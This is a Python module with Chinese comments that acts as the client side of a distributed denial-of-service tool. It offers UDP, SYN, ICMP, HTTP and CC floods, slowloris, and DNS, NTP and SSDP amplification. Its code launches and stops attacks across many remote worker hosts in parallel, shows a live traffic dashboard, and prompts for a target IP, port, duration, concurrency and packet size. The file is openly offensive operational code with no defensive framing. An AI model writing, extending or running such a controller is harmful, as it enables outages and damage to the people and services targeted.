# -*- coding: utf-8 -*-
"""攻击客户端操作（启动/停止/监控/交互）"""
import time
import threading
from concurrent.futures import ThreadPoolExecutor

from rich.live import Live

from cli.common import config, api
from cli.attack import ui

# 攻击类型说明
ATTACK_TYPES = {
    "udp": "UDP 洪泛（打带宽）",
    "tcp": "TCP SYN 洪泛（raw）",
    "icmp": "ICMP 洪泛（raw）",
    "http": "HTTP 洪泛",
    "cc": "CC 攻击（模拟真实请求）",
    "slowloris": "慢速连接（占连接）",
    "dns": "DNS 放大器",
    "ntp": "NTP 放大器",
    "ssdp": "SSDP 放大器",
}


def get_instances():
    """获取所有 running 实例"""
    d = api.get("/api/instances")
    return [i for i in d.get("instances", []) if i.get("status") == "running"]


def filter_workers(workers, worker_ids):
    """按 ID 过滤实例"""
    if not worker_ids:
        return workers
    ids = [w.strip() for w in worker_ids.split(",")]
    return [w for w in workers if w["id"] in ids]


def start_attack(workers, params):
    """并行启动攻击到多个 worker"""
    results = {}
    threads = []

    def _start(inst):
        url = f"https://{inst['hostname']}/api/attack/start"
        r = api.post_url(url, params)
        results[inst["id"]] = {"ok": r.get("ok"), "detail": r}

    for inst in workers:
        t = threading.Thread(target=_start, args=(inst,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return results


def stop_attack(workers):
    """停止多个 worker 的攻击"""
    results = {}
    for inst in workers:
        url = f"https://{inst['hostname']}/api/attack/stop"
        r = api.post_url(url, {})
        results[inst["id"]] = r.get("ok", False)
    return results


def worker_status(hostname):
    """获取单个 worker 的攻击状态"""
    url = f"https://{hostname}/api/attack/status"
    return api.api("GET", url)


def parallel_worker_status(workers):
    """并行获取多个 worker 状态（加快刷新）"""
    results = {}

    def _get(inst):
        s = worker_status(inst["hostname"])
        return inst["id"], {
            "running": s.get("running", False),
            "pps": (s.get("stats") or {}).get("pps", 0),
            "mbps": (s.get("stats") or {}).get("mbps", 0),
            "conns": (s.get("stats") or {}).get("conns", 0),
        }

    with ThreadPoolExecutor(max_workers=len(workers) or 1) as ex:
        for inst_id, stat in ex.map(_get, workers):
            results[inst_id] = stat
    return results


def monitor_attack(workers, duration):
    """实时监控攻击（科技风 Live 界面）"""
    total_seconds = duration
    start_time = time.time()
    history = []

    def _refresh():
        return parallel_worker_status(workers)

    try:
        with Live(console=ui.console, refresh_per_second=2, screen=False) as live:
            while True:
                elapsed = int(time.time() - start_time)
                stats = _refresh()
                total_mbps = sum(s["mbps"] for s in stats.values())
                history.append(total_mbps)
                layout = ui.build_layout(stats, history, elapsed, total_seconds)
                live.update(layout)
                if elapsed >= total_seconds:
                    break
                all_stopped = all(not s["running"] for s in stats.values())
                if all_stopped and elapsed > 3:
                    break
                time.sleep(1.5)
    except KeyboardInterrupt:
        ui.console.print("\n[bold red]⏹ 停止攻击...[/bold red]")
    finally:
        return _refresh()


def select_instances_interactive():
    """交互选择实例（多选）"""
    insts = get_instances()
    if not insts:
        ui.console.print("[red]没有可用的实例[/red]")
        return None
    ui.console.print("[bold cyan]选择攻击实例（可多选，逗号分隔）:[/bold cyan]")
    for idx, i in enumerate(insts):
        ui.console.print(f"  [{idx}] {i['id']} → {i['hostname']}")
    try:
        sel = input("  输入序号（如 0,1,3）: ").strip()
        idxs = [int(x.strip()) for x in sel.split(",") if x.strip().isdigit()]
        return [insts[i] for i in idxs if 0 <= i < len(insts)]
    except Exception:
        return None


def configure_attack_interactive():
    """交互配置攻击参数"""
    ui.console.print("[bold cyan]=== 攻击配置 ===[/bold cyan]")
    target = input("  目标 IP/域名: ").strip()
    if not target:
        return None
    ui.console.print("  攻击类型:")
    for k, v in ATTACK_TYPES.items():
        ui.console.print(f"    {k:<10} {v}")
    atype = input("  类型（默认 udp）: ").strip() or "udp"
    try:
        port = int(input("  端口（默认 80）: ").strip() or "80")
        duration = int(input("  时长秒（默认 60）: ").strip() or "60")
        concurrency = int(input("  并发（默认 500）: ").strip() or "500")
        packet = int(input("  包大小（默认 1400）: ").strip() or "1400")
    except ValueError:
        ui.console.print("[red]参数格式错误[/red]")
        return None
    return {
        "target": target, "type": atype, "port": port,
        "duration": duration, "concurrency": concurrency,
        "packet_size": packet,
    }